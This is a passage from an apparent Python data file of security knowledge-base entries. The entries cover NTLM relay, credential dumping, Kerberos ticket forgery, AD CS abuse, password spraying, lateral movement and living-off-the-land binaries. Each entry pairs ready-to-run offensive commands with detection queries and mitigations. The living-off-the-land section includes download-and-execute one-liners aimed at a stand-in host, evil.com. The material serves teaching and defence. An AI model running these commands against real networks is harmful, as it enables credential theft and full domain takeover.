        "tags": ["ntlm-relay", "responder", "ntlmrelayx", "T1557.001", "man-in-the-middle", "LLMNR"],
        "content": r"""# NTLM Relay Attacks — Responder, ntlmrelayx, and Mitigation

## Overview

NTLM relay attacks intercept NTLM authentication challenges and relay them to another server, authenticating as the victim without ever cracking a password. On a default Windows network, an attacker can often go from zero network access to domain admin in minutes using only Responder and ntlmrelayx.

## MITRE ATT&CK Mapping

| Technique ID | Name | Tactic |
|---|---|---|
| T1557.001 | Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning | Credential Access |
| T1557.002 | Adversary-in-the-Middle: ARP Cache Poisoning | Credential Access |
| T1212 | Exploitation for Credential Access | Credential Access |

## Phase 1 — Credential Capture (Responder)

Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are Windows name resolution fallbacks. When DNS fails, Windows broadcasts the query — Responder answers, directing traffic to the attacker.

```bash
# Start Responder (captures NTLMv2 hashes from nearby hosts)
sudo responder -I eth0 -dwv
# -d: DHCP poisoning
# -w: WPAD proxy
# -v: verbose

# When any Windows host on the subnet tries to access a non-existent share:
# \\nonexistentserver\share
# Windows → broadcasts LLMNR query
# Responder → "That's me!" → Windows sends NTLM auth
# Responder captures NTLMv2 hash

# Hash saved to: /usr/share/responder/logs/SMB-NTLMv2-*.txt
# Crack offline:
hashcat -m 5600 ntlmv2_hashes.txt rockyou.txt -r best64.rule
```

## Phase 2 — NTLM Relay (ntlmrelayx)

Instead of capturing for offline cracking, relay the authentication in real time to a target server:

```bash
# Step 1: Disable SMB/HTTP in Responder (so relaying, not capturing)
# Edit /etc/responder/Responder.conf:
# SMB = Off
# HTTP = Off

# Step 2: Start ntlmrelayx targeting all hosts without SMB signing
# First: enumerate hosts without SMB signing
nmap --script smb2-security-mode -p445 10.10.10.0/24
crackmapexec smb 10.10.10.0/24 --gen-relay-list relay_targets.txt

# Step 3: Start relay
python3 ntlmrelayx.py -tf relay_targets.txt -smb2support
# When a victim authenticates to Responder:
# → Relay to target → if victim has admin on target: dump SAM/LSA/NTDS
# Output: local admin hashes from target machine

# Interactive relay session
python3 ntlmrelayx.py -tf relay_targets.txt -smb2support -i
# Connects to localhost:11000 for interactive SMB shell

# Relay to LDAP → RBCD (Resource-Based Constrained Delegation) attack
python3 ntlmrelayx.py -t ldap://dc01.targetcorp.com --delegate-access
```

## Advanced Relay — RBCD Attack Chain

```
1. Relay machine account auth to LDAP
2. ntlmrelayx adds fake computer account to domain (CreateChild rights)
3. Configure RBCD: fake computer can delegate to victim computer
4. Request S4U2self + S4U2proxy Kerberos tickets as any user (including Domain Admin)
5. Access victim computer as Domain Admin
```

```bash
# Full automated RBCD relay
python3 ntlmrelayx.py -t ldap://dc01 --delegate-access --no-da --no-acl

# After relay completes — use the created computer account to get TGS
python3 getST.py -spn cifs/victim.targetcorp.com DOMAIN/ATTACKERPC\$ -impersonate Administrator -dc-ip dc01
export KRB5CCNAME=Administrator.ccache
python3 smbexec.py -k -no-pass Administrator@victim.targetcorp.com
```

## Relay to HTTP (WebDAV)

WebDAV enables relaying to HTTP-based services, allowing relay from machines that have SMB signing enabled:

```bash
# Trigger WebDAV auth with UNC path
# \\attacker@80\share → sends NTLM over HTTP (no signing requirement)
python3 ntlmrelayx.py -t http://sharepoint.targetcorp.com/webdav -smb2support

# Coerce WebDAV auth: SpoolSample, PrinterBug, PetitPotam
python3 PetitPotam.py -u user -p password attacker_ip dc01
# Triggers DC to authenticate to attacker's server
# If DC admin account relayed → LDAP relay → DCSync rights → domain compromise
```

## Detection Opportunities

### Network
```kql
// LLMNR queries from broadcast addresses — shouldn't happen if disabled
src_ip: 224.0.0.252 OR src_ip: 255.255.255.255
udp.dstport: (5355 OR 137)

// Multiple hosts sending NTLMv2 auth to same non-domain IP
network.protocol: ntlm AND destination.ip: NOT (known_servers)
AND source.ip: (internal_workstations)
```

### Windows Event Logs
- Event ID 4625 — Failed logon: Responder capturing hashes generates many failed logons on the poisoned host
- Event ID 8001/8002 — NTLM authentication on non-DC machine
- Event ID 4649 — Replay attack detected (Windows built-in protection)

## Prevention

1. **Disable LLMNR**: GPO → Computer Configuration → Administrative Templates → Network → DNS Client → `Turn Off Multicast Name Resolution = Enabled`
2. **Disable NBT-NS**: Network adapter properties → TCP/IPv4 → Advanced → WINS → `Disable NetBIOS over TCP/IP`
3. **Enable SMB Signing**: GPO → `Microsoft network server: Digitally sign communications (always) = Enabled` — **blocks relay attacks**
4. **Enable LDAP signing + channel binding**: Blocks NTLM relay to LDAP
5. **Disable NTLM where possible**: Or enforce NTLM auditing to detect unusual auth
6. **Network Access Control (NAC)**: Prevent rogue devices from joining network segments
""",
    },
    {
        "title": "Credential Dumping — Mimikatz, LSASS, SAM, and DCSync",
        "tags": ["credential-dumping", "mimikatz", "lsass", "SAM", "DCSync", "T1003", "T1003.001"],
        "content": r"""# Credential Dumping — Mimikatz, LSASS, SAM, and DCSync

## Overview

Credential dumping extracts authentication material — password hashes, plaintext passwords, and Kerberos tickets — from Windows systems. This material enables lateral movement, persistence, and full domain compromise.

## MITRE ATT&CK Mapping

| Technique ID | Name | Tactic |
|---|---|---|
| T1003.001 | OS Credential Dumping: LSASS Memory | Credential Access |
| T1003.002 | OS Credential Dumping: Security Account Manager | Credential Access |
| T1003.003 | OS Credential Dumping: NTDS | Credential Access |
| T1003.006 | OS Credential Dumping: DCSync | Credential Access |

## Technique 1 — LSASS Memory Dump

The Local Security Authority Subsystem Service (LSASS) stores credentials for all logged-on users. Dumping LSASS memory extracts NTLM hashes and (on older systems or with Wdigest enabled) plaintext passwords.

```powershell
# Mimikatz — direct LSASS extraction (requires SeDebugPrivilege)
privilege::debug
sekurlsa::logonpasswords  # Extracts all logged-on credentials

# Selective extraction
sekurlsa::wdigest     # Cleartext passwords (requires WDigest enabled)
sekurlsa::kerberos    # Kerberos tickets
sekurlsa::tspkg       # TS credentials

# Dump LSASS process memory to file (more stealthy — dump then parse offline)
# Method 1: Task Manager (interactive, writes to C:\Users\Public\lsass.DMP)
# Method 2: comsvcs.dll via rundll32 (LOLBin)
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id lsass.dmp full

# Method 3: ProcDump (legitimate Sysinternals tool)
procdump.exe -accepteula -ma lsass.exe lsass.dmp

# Parse dump offline with Mimikatz
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords
```

## Technique 2 — SAM Database

The Security Account Manager stores local account hashes. Protected by SYSKEY — requires SYSTEM access to read directly.

```powershell
# Method 1: Registry shadow copy (requires SYSTEM)
reg save HKLM\SAM C:\temp\SAM
reg save HKLM\SYSTEM C:\temp\SYSTEM
# Transfer to attacker machine and parse:
python3 secretsdump.py -sam SAM -system SYSTEM LOCAL

# Method 2: Mimikatz — direct SAM dump
token::elevate
lsadump::sam

# Method 3: VSS (Volume Shadow Copy) — bypasses file locks
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\temp\SAM
```

## Technique 3 — DCSync (Remote NTDS.dit Extraction)

DCSync abuses the Directory Replication Service (DRS) remote protocol. Instead of physically accessing the NTDS.dit file, it mimics a domain controller requesting replication of password data. Requires `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All` rights.

```powershell
# Mimikatz DCSync — dump all domain hashes (requires Replication rights)
lsadump::dcsync /domain:targetcorp.com /all /csv
# Or specific user:
lsadump::dcsync /domain:targetcorp.com /user:Administrator
lsadump::dcsync /domain:targetcorp.com /user:krbtgt  # Enables Golden Ticket creation

# Impacket secretsdump — same DCSync remotely
python3 secretsdump.py targetcorp.com/DA_admin:password@dc01.targetcorp.com
python3 secretsdump.py targetcorp.com/DA_admin@dc01 -hashes :HASH

# Output includes all NTDS.dit hashes:
# Administrator:500:aad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
# Format: username:RID:LM_hash:NT_hash:::
```

## Technique 4 — NTDS.dit Physical Extraction

```powershell
# DC only — requires local admin on DC
# NTDS.dit is locked while AD is running, use VSS

vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\temp\
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\

# Parse on attacker machine
python3 secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
# Extracts all ~50,000+ domain account hashes
```

## Detection Opportunities

### Sysmon / EDR
```
Event ID 10 — Process Access (Sysmon)
  TargetImage: lsass.exe
  GrantedAccess: 0x1010 or 0x1410 (read + query)
  → Any process accessing LSASS with memory-read permissions

Event ID 1 — Process Create
  Image: procdump.exe, taskmanager (comsvcs.dll)
  CommandLine: contains "lsass" or process ID of lsass
```

### Windows Security Events
```
Event ID 4662 — An operation was performed on an object
  ObjectType: %{19195a5b-6da0-11d0-afd3-00c04fd930c9}  (domainDNS)
  Properties: Replication rights GUIDs
  → DCSync detection: non-DC account performing replication

Event ID 4768 + 4769 shortly after DCSync — attacker testing dumped hashes
```

### SIEM Rule (DCSync)
```kql
// DCSync from non-DC source
SecurityEvent
| where EventID == 4662
| where ObjectType contains "19195a5b-6da0-11d0-afd3-00c04fd930c9"
| where Properties has_any ("1131f6aa", "1131f6ad", "89e95b76")  // replication property GUIDs
| where SubjectUserName !endswith "$"  // not machine account
| where not (SubjectUserName in (known_dc_hostnames))
```

## Prevention

1. **Credential Guard**: Isolates LSASS in VSM — prevents memory dumping
2. **Protected Users group**: Removes credentials from LSASS memory cache
3. **LSASS Protected Process Light (PPL)**: `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\RunAsPPL = 1` — prevents most LSASS dumping tools
4. **Disable WDigest**: `HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\UseLogonCredential = 0`
5. **DCSync alert**: Monitor for non-DC accounts requesting replication (Event 4662 with replication GUIDs)
6. **Tiered access model**: Ensure only DC accounts have replication rights
7. **EDR with LSASS protection**: CrowdStrike, SentinelOne block procdump/comsvcs-based dumps
""",
    },
    {
        "title": "Golden Ticket and Silver Ticket Attacks",
        "tags": ["golden-ticket", "silver-ticket", "kerberos", "T1558.001", "T1558.002", "persistence", "mimikatz"],
        "content": r"""# Golden Ticket and Silver Ticket Attacks

## Overview

Golden Ticket and Silver Ticket attacks forge Kerberos tickets using stolen cryptographic keys, granting persistent, near-undetectable access to Active Directory resources. They represent the pinnacle of Active Directory compromise — sometimes called "domain persistence" techniques.

## MITRE ATT&CK Mapping

| Technique ID | Name | Tactic |
|---|---|---|
| T1558.001 | Steal or Forge Kerberos Tickets: Golden Ticket | Credential Access / Persistence |
| T1558.002 | Steal or Forge Kerberos Tickets: Silver Ticket | Credential Access / Lateral Movement |

## Golden Ticket — Domain-Level Persistence

A Golden Ticket is a forged Ticket Granting Ticket (TGT) signed with the `krbtgt` account's NTLM hash. Since the KDC validates TGTs using this hash, a valid-looking forged ticket is indistinguishable from legitimate ones.

**Prerequisites:** `krbtgt` NTLM hash (from DCSync or NTDS.dit dump)

```powershell
# Step 1: Obtain krbtgt hash
# DCSync (requires DA):
lsadump::dcsync /user:krbtgt /domain:targetcorp.com
# Output: Hash NTLM: 1a2b3c4d5e6f... ← this is the krbtgt hash

# Step 2: Get domain SID
Get-ADDomain | Select-Object DomainSID
# Or from Mimikatz output: S-1-5-21-XXXXXXXXX-XXXXXXXXX-XXXXXXXXX

# Step 3: Create Golden Ticket
kerberos::golden /user:FakeAdmin /domain:targetcorp.com /sid:S-1-5-21-XXX /krbtgt:HASH /id:500 /ptt
# Parameters:
# /user: any username (real or fake — doesn't need to exist)
# /id:500 = Administrator RID
# /ptt = inject into current session immediately
# Optional: /startoffset:-10 /endin:600 /renewmax:10080 (ticket validity times)

# Step 4: Access any resource in the domain
dir \\dc01\C$
PsExec.exe \\anyhostinthe.domain cmd
```

**Persistence:** The Golden Ticket remains valid until:
- The `krbtgt` account password is reset **twice** (both current and previous hash are valid)
- Ticket lifetime expires (default 10 years when created with Mimikatz)

## Silver Ticket — Service-Level Forgery

A Silver Ticket is a forged Service Ticket (TGS) signed with a specific service account's hash. More targeted than Golden Tickets — grants access to one specific service only.

**Prerequisites:** Service account NTLM hash (machine account hash for Windows services)

```powershell
# Step 1: Obtain service account hash (machine accounts for HOST, CIFS, etc.)
# Machine account hash = computer's password hash
lsadump::dcsync /user:FILESERVER$ /domain:targetcorp.com

# Step 2: Create Silver Ticket for SMB/CIFS access
kerberos::silver /user:Administrator /domain:targetcorp.com /sid:S-1-5-21-XXX /target:fileserver.targetcorp.com /service:cifs /rc4:MACHINE_HASH /ptt
# /target: target server FQDN
# /service: service type (cifs, host, ldap, http, mssql, wsman)

# Step 3: Access the specific service
dir \\fileserver.targetcorp.com\C$

# Silver Ticket for WMI (host service)
kerberos::silver /user:Administrator /domain:targetcorp.com /sid:S-1-5-21-XXX /target:workstation01.targetcorp.com /service:host /rc4:HASH /ptt
wmic /node:workstation01.targetcorp.com process call create "cmd /c whoami > C:\temp\out.txt"
```

## Comparison

| Property | Golden Ticket | Silver Ticket |
|---|---|---|
| Hash required | krbtgt (DA needed to obtain) | Target service/computer account |
| Scope | Full domain access | Single service on one host |
| KDC involvement | None (no TGT validation for ST) | None |
| Detection | Event 4769 missing for service access | Event 4769 missing |
| Persistence | ~10 years (or until 2x krbtgt reset) | Until service account password changes |

## Detection Opportunities

### Windows Event Logs
```
Golden/Silver ticket detection is notoriously difficult.

Key anomalies:
Event ID 4769 — TGS request
  - Silver ticket: NO corresponding 4769 event (ticket forged, never sent to KDC)
  - Golden ticket: If ticket lifetime > domain policy, Microsoft ATA/Defender Identity detects anomaly

Event ID 4672 — Special privileges assigned to new logon
  Combined with logon from unexpected source

Microsoft Defender for Identity detects:
  - Kerberos ticket anomalies (unusual lifetime, nonexistent account name in ticket)
  - Forged PAC signatures (if PAC validation enabled)
```

### Honey Accounts
```powershell
# Create a honey account — decoy that should never log on
New-ADUser -Name "HoneySvc" -SamAccountName "svc_monitor" -ServicePrincipalName "fake/service"
# Alert on ANY authentication attempt for this account
# Attackers who DCSync all hashes will have this hash and may use it
```

## Prevention

1. **Double-reset krbtgt password**: Use Microsoft's `New-KrbtgtKeys.ps1` script — reset twice, 10+ hours apart (active tickets expire)
2. **Privileged Identity Management**: Limit who can DCSync (obtain krbtgt hash)
3. **Enable PAC verification**: `ValidateKdcPacSignature` — adds KDC validation step (small performance cost)
4. **Microsoft Defender for Identity**: Detects forged ticket anomalies, DCSync events
5. **Ticket lifetime policy**: Short ticket lifetimes increase detection windows (but attacker can refresh)
6. **Monitor for anomalous Kerberos ticket properties**: Unusual validity periods, nonexistent usernames in tickets
""",
    },
    {
        "title": "Active Directory Certificate Services (AD CS) Exploitation",
        "tags": ["ADCS", "ESC1", "ESC8", "certificates", "T1649", "active-directory", "privesc"],
        "content": r"""# Active Directory Certificate Services (AD CS) Exploitation

## Overview

AD CS vulnerabilities (ESC1–ESC13, documented by SpecterOps in "Certified Pre-Owned") allow domain privilege escalation and persistence through misconfigurations in certificate templates, CAs, and enrollment permissions. AD CS attacks have become standard in ransomware playbooks since 2021.

## MITRE ATT&CK Mapping

| Technique ID | Name | Tactic |
|---|---|---|
| T1649 | Steal or Forge Authentication Certificates | Credential Access |
| T1550.001 | Use Alternate Authentication Material: Application Access Token | Lateral Movement |
| T1588.004 | Obtain Capabilities: Digital Certificates | Resource Development |

## Enumeration

```powershell
# Certify (SpecterOps) — enumerate vulnerable templates and CAs
.\Certify.exe find /vulnerable
# Output lists: template name, vulnerable ACEs, enrollment permissions

# Certipy (Python/Linux)
certipy find -u user@targetcorp.com -p password -dc-ip 10.10.10.1 -vulnerable
# Creates: targetcorp.com_Certipy.zip with BloodHound-compatible JSON

# Manual LDAP enumeration
ldapsearch -H ldap://dc01 -x -b "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=targetcorp,DC=com" "(objectclass=pKICertificateTemplate)" name pKIExtendedKeyUsage
```

## ESC1 — Enrollee Supplies Subject (SAN)

Most critical. Certificate template allows requester to specify Subject Alternative Name (SAN), includes Client Authentication EKU, and permits low-privilege users to enroll.

```powershell
# With Certify — request cert for Domain Admin
.\Certify.exe request /ca:dc01\targetcorp-DC01-CA /template:VulnerableTemplate /altname:Administrator

# With Certipy (Linux)
certipy req -u lowpriv@targetcorp.com -p password -ca 'targetcorp-DC01-CA' -template VulnerableTemplate -upn administrator@targetcorp.com

# Convert .pem to .pfx
certipy cert -pfx cert.pfx -pem cert.pem

# Authenticate with certificate → get NTLM hash (PKINIT)
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1
# Output: administrator NTLM hash → use for PtH
```

## ESC8 — NTLM Relay to HTTP AD CS Enrollment Endpoint

AD CS web enrollment (certsrv) supports NTLM auth. If running over HTTP (not HTTPS), relay attacks apply.

```bash
# Step 1: Coerce DC auth (PetitPotam, PrinterBug)
python3 PetitPotam.py attacker_ip dc01.targetcorp.com

# Step 2: Relay to AD CS HTTP enrollment
python3 ntlmrelayx.py -t 'http://ca.targetcorp.com/certsrv/certfnsh.asp' --adcs --template DomainController

# Step 3: Use obtained DC certificate for DCSync/PtH
certipy auth -pfx dc01.pfx -dc-ip 10.10.10.1
# → DC machine account hash → DCSync → all domain hashes
```

## ESC4 — Vulnerable Certificate Template ACL

```powershell
# If an attacker has WriteProperty over a template, they can modify it to become ESC1-vulnerable
.\Certify.exe find
# Look for templates where current user has GenericWrite, WriteDacl, WriteOwner

# Certipy: modify template to enable ESC1
certipy template -u lowpriv@targetcorp.com -p password -template UserAuthentication -save-old
certipy template -u lowpriv@targetcorp.com -p password -template UserAuthentication -target dc01.targetcorp.com

# Revert after exploitation:
certipy template -u lowpriv@targetcorp.com -p password -template UserAuthentication -configuration UserAuthentication.json
```

## Certificate-Based Persistence

```powershell
# Even after password reset, certificate remains valid for its lifetime
# Request certificate for your account → persist after password change

# Request certificate via Certify
.\Certify.exe request /ca:dc01\targetcorp-DC01-CA /template:User

# If domain admin account's certificate obtained → valid for cert lifetime (1-2 years typically)
# NTLM hash obtained via PKINIT even after password change
```

## Detection Opportunities

### Windows Event Logs
```
Event ID 4886 — Certificate Services received a certificate request
Event ID 4887 — Certificate Services approved a certificate request
  → Alert on: DA-level account certificate requests from non-standard workstations
  → Alert on: requests with SAN = privileged account from low-privilege requester

Event ID 4768 — TGT issued for certificate auth (PKINIT)
  → Correlate with certificate enrollment events
```

### Certipy Detection
```kql
// Enrollment requests for sensitive templates from non-standard accounts
SecurityEvent
| where EventID == 4887
| where TemplateOID in (sensitive_template_oids)
| where RequesterName !in (expected_enrollers)
```

## Prevention

1. **Audit certificate templates**: Disable "Enrollee Supplies Subject" unless absolutely necessary; restrict enrollment permissions
2. **Enable HTTPS on AD CS web enrollment**: Prevents NTLM relay (ESC8)
3. **Require manager approval for sensitive templates**: Breaks automated exploitation
4. **Enable CA audit logging**: Ensure all certificate issuance is logged
5. **Monitor privileged certificate enrollment**: Alert on DA-equivalent accounts requesting certificates
6. **Regularly audit published templates**: Remove unused templates; review EKU settings
7. **Patch**: Microsoft has released KB5014754 (May 2022) addressing certificate-based auth bypass
""",
    },
    {
        "title": "Password Spraying and Credential Stuffing at Scale",
        "tags": ["password-spraying", "credential-stuffing", "T1110.003", "T1110.004", "brute-force", "authentication"],
        "content": r"""# Password Spraying and Credential Stuffing at Scale

## Overview

Password spraying tries a few common passwords against many accounts (avoiding lockout), while credential stuffing replays username/password pairs from data breaches. Both techniques are high-volume, automated, and used as primary initial access methods by ransomware affiliates and nation-state actors.

## MITRE ATT&CK Mapping

| Technique ID | Name | Tactic |
|---|---|---|
| T1110.003 | Brute Force: Password Spraying | Credential Access |
| T1110.004 | Brute Force: Credential Stuffing | Credential Access |
| T1078.002 | Valid Accounts: Domain Accounts | Initial Access |

## Password Spraying

### Target Identification
```bash
# Enumerate valid usernames via LDAP (if on network)
ldapsearch -x -H ldap://dc01 -D "user@domain.com" -w password -b "DC=domain,DC=com" "(objectClass=user)" sAMAccountName

# O365 user enumeration (no auth needed)
python3 o365enum.py -u users.txt -p none -t 8
# Checks if email addresses are valid O365 accounts

# LinkedIn-to-email format enumeration
linkedin2username -c targetcorp -d targetcorp.com > potential_users.txt
```

### Spray Execution
```bash
# SprayingToolkit / Spray (O365/OWA)
python3 sprayhound.py -U users.txt -p "Winter2025!" -d targetcorp.com --dc dc01.targetcorp.com
# Rate: 1 attempt per user, wait >30 min between rounds (default lockout = 10 bad attempts in 10 min)

# Ruler (O365/Exchange)
ruler -email user@targetcorp.com brute --users users.txt --passwords passwords.txt --delay 0 --stop-on-success

# MailSniper (PowerShell)
Invoke-PasswordSprayOWA -ExchHostname mail.targetcorp.com -UserList users.txt -Password "Summer2025!"

# MSOLSpray (Azure AD)
Invoke-MSOLSpray -UserList users.txt -Password "Welcome2025" -Verbose

# CrackMapExec — SMB spray across subnet
crackmapexec smb 10.10.10.0/24 -u users.txt -p "Password123!" --continue-on-success
```

### Target Selection for Spraying
Passwords that work best:
- **Seasonal**: `Winter2025!`, `Summer2025!`, `Spring2025@`
- **Company name**: `Targetcorp1!`, `TargetCorp2025`
- **Common patterns**: `Password1!`, `Welcome1!`, `Changeme1!`
- **Keyboard walks**: `Qwerty123!`, `Asdfghjkl1`

## Credential Stuffing

```bash
# Obtain breached credential lists
# - HaveIBeenPwned (paid API): breach data by domain
curl -s "https://haveibeenpwned.com/api/v3/breaches" | jq '.[].Title'
# - Dehashed, LeakCheck — paid search services
# - Credential markets on Telegram/darkweb

# Format conversion (different tools expect different formats)
# combo list (user:pass) → separate files
awk -F: '{print $1}' combo.txt > users.txt
awk -F: '{print $2}' combo.txt > passwords.txt

# Snipr (Windows) — credential stuffing against web targets
# Supports: Office365, Gmail, custom targets with templates

# Storm (Python) — modular credential stuffing
python3 storm.py -t office365 -c combolist.txt -p 50 --proxy proxies.txt

# Using residential proxy rotation to avoid IP blocks
# ProxyMesh, Oxylabs, Bright Data — rotate IPs per attempt
```

## Detection Opportunities

### Authentication Logs / SIEM
```kql
// Password spraying pattern: many accounts, few attempts each, from single IP
SecurityEvent
| where EventID == 4625  // failed logon
| where TimeGenerated > ago(1h)
| summarize
    failed_accounts = dcount(TargetUserName),
    total_failures = count()
  by IpAddress, bin(TimeGenerated, 10m)
| where failed_accounts > 10 and total_failures < (failed_accounts * 3)
// Low attempts per account (spray) vs high attempts per account (brute force)

// Azure AD — spray from single IP
SigninLogs
| where ResultType == "50126"  // invalid credentials
| summarize failures = count(), accounts = dcount(UserPrincipalName) by IPAddress, bin(TimeGenerated, 1h)
| where failures > 20 and accounts > 5
```

### Network / WAF
- High volume of authentication requests from single IP or ASN
- Authentication attempts outside business hours
- User agent strings not associated with standard browser/client software

## Prevention

1. **MFA on all accounts**: Even a valid password is useless if MFA is required
2. **Smart lockout / Account protection**: Azure AD Smart Lockout, Okta Adaptive MFA — detect spray patterns and block
3. **Password complexity + banned password lists**: Block common passwords (HIBP integration)
4. **Conditional Access — risky sign-in policies**: Block or require MFA for detected risky auth attempts
5. **IP reputation filtering**: Block authentication from known-bad IPs, Tor exit nodes, data centres
6. **Spray detection alerts**: Alert on >10 unique accounts with failed auth from single IP within 30 minutes
7. **Canary accounts**: Accounts that should never authenticate — instant alert if any auth attempt occurs
""",
    },
]

# ============================================================
# COLLECTION 3: LATERAL MOVEMENT & PERSISTENCE
# ============================================================

LATERAL_PERSISTENCE = [
    {
        "title": "Lateral Movement Techniques — PsExec, WMI, WinRM, RDP, SMB",
        "tags": ["lateral-movement", "psexec", "wmi", "winrm", "rdp", "T1021", "T1570"],
        "content": r"""# Lateral Movement Techniques — PsExec, WMI, WinRM, RDP, SMB

## Overview

Lateral movement techniques allow attackers to traverse from one compromised host to others on the network. Each method leaves different forensic artefacts, making detection dependent on which methods an attacker chooses and which logs are collected.

## MITRE ATT&CK Mapping

| Technique ID | Name | Tactic |
|---|---|---|
| T1021.001 | Remote Services: Remote Desktop Protocol | Lateral Movement |
| T1021.002 | Remote Services: SMB/Windows Admin Shares | Lateral Movement |
| T1021.003 | Remote Services: Distributed Component Object Model | Lateral Movement |
| T1021.006 | Remote Services: Windows Remote Management | Lateral Movement |
| T1047 | Windows Management Instrumentation | Execution |
| T1570 | Lateral Tool Transfer | Lateral Movement |

## PsExec (T1021.002)

PsExec (Sysinternals) copies a service binary over SMB, creates a service on the remote host, starts it, and provides an interactive shell.

```powershell
# Sysinternals PsExec
PsExec.exe \\target -u DOMAIN\\admin -p password cmd

# With hash (Impacket)
python3 psexec.py DOMAIN/admin@10.10.10.50 -hashes :NTLM_HASH

# CrackMapExec
crackmapexec smb 10.10.10.50 -u admin -H NTLM_HASH -x "whoami"
```

**Artefacts:**
- Service creation: Event 7045 (System log) on target
- SMB connection: Event 4624 (LogonType 3) + 4648
- Binary dropped: PSEXESVC.exe in C:\\Windows\\ (classic variant)
- Network: SMB (445) + named pipe \\pipe\\svcctl

## WMI (T1047)

WMI allows remote command execution. No binary is dropped on disk.

```powershell
# wmic — built-in Windows tool
wmic /node:10.10.10.50 /user:DOMAIN\\admin /password:password process call create "cmd /c whoami"

# Impacket wmiexec (interactive shell, no service creation)
python3 wmiexec.py DOMAIN/admin:password@10.10.10.50

# CrackMapExec WMI
crackmapexec smb 10.10.10.50 -u admin -p password -x "whoami" --exec-method wmiexec
```

**Artefacts:**
- Event 4624 (LogonType 3)
- WMI Activity log Event 5861
- NO service creation, NO binary on disk

## WinRM / PowerShell Remoting (T1021.006)

```powershell
# Interactive session
Enter-PSSession -ComputerName target -Credential (Get-Credential)

# evil-winrm
evil-winrm -i 10.10.10.50 -u admin -p password
evil-winrm -i 10.10.10.50 -u admin -H NTLM_HASH
```

**Artefacts:**
- Event 4624 (LogonType 3)
- PowerShell Script Block Logging (Event 4104)
- Network: TCP 5985/5986

## RDP (T1021.001)

```bash
xfreerdp /u:admin /p:password /v:10.10.10.50 /cert-ignore

# Restricted Admin Mode (PtH capable)
xfreerdp /u:admin /pth:HASH /v:10.10.10.50 /restricted-admin
```

**Artefacts:**
- Event 4624 (LogonType 10 = RemoteInteractive)
- TerminalServices logs
- Network: TCP 3389

## Detection Summary Table

| Method | Key Event IDs | Network Port | Binary on Disk |
|---|---|---|---|
| PsExec | 7045, 4624 (L3) | 445 | Yes |
| WMI | 4624 (L3), 5861 | 135 | No |
| WinRM | 4624 (L3), 4104 | 5985/5986 | No |
| RDP | 4624 (L10), TS logs | 3389 | No |

## Prevention

1. **Host-based firewall**: Block SMB/WMI/WinRM between workstations
2. **Network segmentation**: Workstations isolated — no lateral SMB movement
3. **Disable WinRM** on workstations: `Disable-PSRemoting -Force`
4. **RDP restrictions**: Allow only from jump hosts; enable NLA
5. **LAPS**: Unique local admin passwords prevent hash reuse
6. **Privileged Access Workstations**: Admin actions only from dedicated PAWs
""",
    },
    {
        "title": "Living Off the Land — Using Built-in OS Tools for Offense",
        "tags": ["LOLBAS", "LOLBins", "living-off-the-land", "T1218", "T1059", "defense-evasion"],
        "content": r"""# Living Off the Land — Using Built-in OS Tools for Offense

## Overview

"Living off the land" (LOTL) means using tools already present on the OS for malicious purposes. These are legitimate, signed binaries that often bypass application allowlisting and reduce AV/EDR detection. LOLBAS catalogues hundreds of Windows binaries that can be abused.

## MITRE ATT&CK Mapping

| Technique ID | Name | Tactic |
|---|---|---|
| T1218 | System Binary Proxy Execution | Defense Evasion |
| T1059.001 | PowerShell | Execution |
| T1140 | Deobfuscate/Decode Files | Defense Evasion |
| T1105 | Ingress Tool Transfer | Command and Control |

## File Download

```powershell
# certutil.exe — download and decode
certutil.exe -urlcache -split -f http://evil.com/payload.exe C:\\temp\\payload.exe
certutil.exe -decode encoded.b64 output.exe

# bitsadmin.exe
bitsadmin /transfer job /download /priority normal http://evil.com/p.exe C:\\temp\\p.exe

# PowerShell
(New-Object Net.WebClient).DownloadFile("http://evil.com/p.exe","C:\\temp\\p.exe")
IEX (New-Object Net.WebClient).DownloadString("http://evil.com/rev.ps1")
```

## Code Execution

```powershell
# mshta.exe — execute HTA
mshta.exe http://evil.com/payload.hta

# regsvr32.exe — squiblydoo (bypasses AppLocker)
regsvr32.exe /s /n /u /i:http://evil.com/payload.sct scrobj.dll

# rundll32.exe — LSASS dump via comsvcs
rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump <PID> C:\\temp\\lsass.dmp full

# msiexec.exe — install MSI from URL
msiexec.exe /q /i http://evil.com/payload.msi

# MSBuild.exe — execute inline C# tasks
msbuild.exe payload.xml

# InstallUtil.exe — execute .NET assembly
InstallUtil.exe /logfile= /LogToConsole=false /U payload.exe
```

## Reconnaissance with Built-ins

```cmd
net view /domain
net group "Domain Admins" /domain
nltest /dclist:targetcorp.com
systeminfo
wmic qfe list brief
cmdkey /list
reg query "HKCU\\Software\\SimonTatham\\PuTTY\\Sessions" /s
```

## Detection Opportunities

```kql
// certutil download
process.name: "certutil.exe" AND process.args: ("-urlcache" OR "-decode")

// Regsvr32 network connection (squiblydoo)
event.code: "3" AND process.name: "regsvr32.exe"

// rundll32 LSASS dump
process.name: "rundll32.exe" AND process.args: ("comsvcs" OR "MiniDump")

// mshta spawned by Office
process.parent.name: ("WINWORD.EXE" OR "EXCEL.EXE") AND process.name: "mshta.exe"
```

## Prevention

1. **WDAC / AppLocker**: Block certutil, mshta, regsvr32 for standard users
2. **ASR Rules**: Target specific LOLBIN abuse patterns
3. **Script Block Logging**: Captures all PowerShell execution
4. **Network egress filtering**: Block LOLBin outbound at proxy/firewall
5. **Constrained Language Mode**: Limits PowerShell when WDAC enforced
6. **LOLBAS reference**: Monitor lolbas-project.github.io for new entries
""",
    },
    {
